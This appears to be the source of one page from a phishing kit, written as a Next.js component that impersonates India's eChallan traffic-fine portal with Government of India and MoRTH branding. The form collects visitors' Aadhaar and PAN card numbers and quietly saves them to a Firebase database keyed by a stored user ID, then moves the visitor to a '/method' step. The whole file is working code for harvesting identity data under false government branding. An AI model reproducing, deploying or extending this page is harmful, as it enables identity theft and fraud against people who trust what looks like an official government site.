"use client";
import { useState } from "react";
import { ref, push, serverTimestamp, update } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Home() {
  const router = useRouter();

  const [formData, setFormData] = useState({
    aadhar: "",
    pan: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Get a reference to the "entries" node in Firebase database
    const formRef = ref(database, "entries");

    // Generate timestamp in milliseconds
    const timestamp = Date.now();

    // Add current timestamp to form data
    const formDataWithTime = {
      ...formData,
      time: timestamp,
    };

    // Push form data to Firebase database
    // const newRef = await push(formRef, formDataWithTime);

    const storedUserId = localStorage.getItem("newUserId");
    if (!storedUserId) {
      console.error("User ID not found in localStorage");
      return;
    }

    const userRef = ref(database, `entries/${storedUserId}`);
    await update(userRef, formDataWithTime);

    // Navigate to "/method" route after submission
    router.push("/method");

    // Clear form data after submission
    setFormData({
      aadhar: "",
      pan: "",
    });
  };

  return (
    <div>
      <section className="w-full">
        <div className="flex flex-col justify-center items-center px-5 py-10 bg-[#003466]">
          {/* Logo */}
          <img
            src="/Government-of-India-Logo-Vector-PNG.png"
            className="w-10"
            alt="Logo"
          />
          <h1 className="text-white text-base font-bold mt-5">भारत सरकार</h1>
          <h1 className="text-white text-base font-bold mt-1">
            Government of India
          </h1>
          <h1 className="text-white text-base font-bold mt-5 text-center">
            eChallan - Digital Traffic/Transport Enforcement Solution
          </h1>
          <span className="text-white text-xs mt-5 text-center">
            An initiative of MoRTH, Goverment Of India
          </span>
        </div>
        <div className="p-2">
          <form className="p-5" onSubmit={handleSubmit}>
            <div className="space-y-6 flex flex-col justify-center mt-5 p-1 rounded-none">
              {/* Show aadhar input only if selected option is not "Other" */}

              <div className="mb-4">
                <label
                  htmlFor="aadhar"
                  className="block mb-2 text-sm font-bold text-gray-900"
                >
                  Aadhar Card Number <span className="text-red-500">*</span>
                </label>
                <input
                  className="shadow-sm placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none border-[2px]"
                  id="aadhar"
                  type="text"
                  name="aadhar"
                  placeholder="0000 0000 0000"
                  value={formData.aadhar}
                  onChange={handleChange}
                />
              </div>

              {/* Pan */}
              <div className="mb-4">
                <label
                  htmlFor="pan"
                  className="block mb-2 text-sm font-bold text-gray-900"
                >
                  PAN Card Number <span className="text-red-500">*</span>
                </label>
                <input
                  className="shadow-sm placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none border-[2px]"
                  id="pan"
                  type="text"
                  name="pan"
                  placeholder="ABCDE1234F"
                  value={formData.pan}
                  onChange={handleChange}
                />
              </div>

              <div className="w-full grid grid-cols-2 justify-center items-center mt-5 space-x-2">
                <button className="bg-gradient-to-r from-[#cecece] to-[#cecece] text-black uppercase rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto">
                  Back
                </button>
                <button
                  className="bg-gradient-to-r from-[#003466] to-[#003466] text-white uppercase rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                  type="submit"
                >
                  Proceed
                </button>
              </div>
            </div>
          </form>
        </div>
      </section>
      {/* <!-- Footer --> */}
      <section className="bg-[#ffffff] p-5 w-full mt-24">
        <div className="flex space-x-1 w-full justify-between">
          <span className="text-xs text-black font-bold">Support</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Find Us</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Pricing & Fees</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Compliance</span>
        </div>
        <div className="flex space-x-1 w-full justify-between mt-2">
          <span className="text-xs text-black font-bold">
            Terms & Conditions
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Legal Disclosures
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Safety Guidelines
          </span>
        </div>
        <div className="mt-5 text-[10px] text-black">
          Copyright @2021-2024 eChallan. All rights reserved.
        </div>
      </section>
    </div>
  );
}
